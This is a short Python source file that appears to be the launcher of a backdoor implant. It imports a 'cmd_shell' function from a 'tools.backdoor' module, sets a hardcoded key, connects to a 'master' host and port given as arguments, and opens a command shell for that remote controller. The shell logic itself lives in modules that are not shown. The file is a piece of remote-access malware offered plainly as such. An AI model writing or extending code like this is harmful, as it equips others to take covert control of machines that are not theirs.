from utils.connection import connect_master
from utils.args import get_args
from tools.backdoor import cmd_shell

KEY = ""
# exit with os._exit(1) parent after forking
def main():
    global KEY
    key = "mylittlepony"
    KEY = bytes(key, 'utf-8')
    master_hostname, master_port = get_args()
    conn = connect_master(master_hostname, master_port)
    cmd_shell(conn, master_hostname, master_port)


if __name__ == "__main__":
    main()
